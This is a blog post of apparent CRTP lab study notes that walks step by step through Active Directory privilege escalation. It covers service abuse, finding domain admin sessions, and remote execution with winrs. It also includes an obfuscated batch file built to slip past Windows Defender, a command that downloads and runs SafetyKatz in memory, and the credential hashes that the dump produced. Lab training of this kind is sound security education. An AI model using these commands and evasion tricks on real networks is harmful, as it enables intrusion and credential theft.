---
title: Active Directory (AD) | Local Privilege Escalation (Part 1)
date: 2024-06-25 7:40:00 +0800
categories: [Cert, CRTP]
tags: [Cert, Active Directory]     ## TAG names should always be lowercase
render_with_liquid: false
render_with_liquid: false
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---


## Local Privilege Escalation

### Scenarios Leading to Privilege Escalation
 
 - Hunting for Local Admin Access: Gain local admin access on other machines.
 - Hunting for High Privilege Domain Accounts: Target accounts like Domain Administrator.
 - Example Scenario : 
    1. I have local admin access on a machine
    2. A Domain Admin has a session on that machine
    3. I steal his token and impersonate him
    4. Profit!

### Methods of Local Privilege Escalation on Windows
 
 - Missing Patches
 - Automated Deployment and AutoLogon password in clear text
 - AlwaysInstallElevated (Any user can run MSI on SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more
 - NTLM Relaying a.k.a Wont’t Fix
 - NTLM Relaying example - https://github.com/antonioCoco/RemotePotato0

### Essential Tools for Complete Coverage
 
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - https://github.com/enjoiz/Privesc
 - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY

## Step 1: Check for Privilege Escalation Paths

**Tools Used:** PowerView

This step ensures you can escalate your privileges on the current machine to gain local admin rights. Start by checking for any privilege escalation paths. If any services can be abused, add your domain user to the local admin group.

### Check for any priviliege escalation path
```bash
Invoke-AllChecks
```
![Result](/img/crtp/result1.png){: width="972" height="589" }
_Invoke-AllChecks_


### Abusing Services
Add your current domain user to the local Administrators group.

```bash
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```

![Result](/img/crtp/result2.png){: width="972" height="589" }
_Now, our user is a local admin !_


## Step 2: Identify Machines with Local Admin Access

**Tools Used:** Find-PSRemotingLocalAdminAccess.ps1

After gaining local admin rights on one machine, identifying other machines where you have local admin access helps in expanding your control over the network. This can give you access to more resources, data, or higher-privilege accounts. So, you have to identify any computers/machines in the domain where our user has local administrative access.

### Identifying Computers with Local Admin Access

```bash
Find-PSRemotingLocalAdminAccess
```
![Result](/img/crtp/result3.png){: width="972" height="589" }
_studentx has administrative access on dcorp-adminsrv and on the student machine_

So, studentx has administrative access on **dcorp-adminsrv** and on the **student machine.** We can connect to the machine with local administrative access using winrs or powershell remoting.
### Using winrs
```bash
winrs -r:dcorp-adminsrv cmd
set username
set computername
```
![Result](/img/crtp/result4.png){: width="972" height="589" }

### PowerShell Remoting
```bash
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
![Result](/img/crtp/result5.png){: width="972" height="589" }

## Step 3: Identify Machines with Domain Admin Sessions

**Tools Used:** PowerView

After gaining local admin access on multiple machines, the next objective is often to escalate to **domain admin** privileges. Identifying machines where domain admin accounts are actively logged in provides an opportunity to steal their tokens and elevate privileges within the domain.

### Finding Domain User Locations
To identify machines where domain admin sessions are active, we can query the Domain Controller for information on ComputerNames and membership of the domain admin group with active sessions.
```bash
Find-DomainUserLocation
```
![Result](/img/crtp/result6.png){: width="972" height="589" }
_There is a domain admin session on dcorp-mgmt server!_

This information allows us to potentially exploit these sessions using techniques like winrs or PowerShell Remoting.

## Step 4: Extract Credential

**Tools Used:** SafetyKatz.exe

### **Abuse using winrs**
To extract credentials from dcorp-mgmt, we will use SafetyKatz.exe. We need to avoid direct detection, so we'll transfer Loader.exe from dcorp-ci to dcorp-mgmt.

- Ensure WinRM Port is Open 

First, check if you can execute commands on dcorp-mgmt and confirm if the WinRM port is open:

```bash
winrs -r:dcorp-mgmt hostname;whoami
```
![Result](/img/crtp/result7.png){: width="972" height="589" }

- Download Loader.exe

Download Loader.exe to dcorp-ci:

```bash
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

- Copy Loader.exe to dcorp-mgmt

Copy Loader.exe from dcorp-ci to dcorp-mgmt:

```bash
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

- Set Up Port Forwarding

Establish port forwarding on dcorp-mgmt to evade detection. Use $null for output redirection to prevent command execution issues:

```bash
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

- Generate Encoded Arguments

To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader. Run the below command on the student VM to generate encoded arguments for sekurlsa::ekeys (this step does not need to be run on the reverse shell):

```bash
ArgSplit.bat
```

![Result](/img/crtp/result8.png){: width="972" height="589" }

- Create Batch File

Create a batch file with the encoded arguments. Below are the contents of the batch file(Safety.bat):
```bash
@echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn%
exit
```

Download the batch file on dcorp-ci:
```bash
iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
```

- Copy Safety.bat to dcorp-mgmt

Copy the batch file from dcorp-ci to dcorp-mgmt:

```bash
echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```

- Execute Safety.bat

Run the batch file on dcorp-mgmt that uses Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:

```bash
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
```

If successful, you should see output similar to:

```bash
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 3/3/2023 2:39:12 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
* Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
```
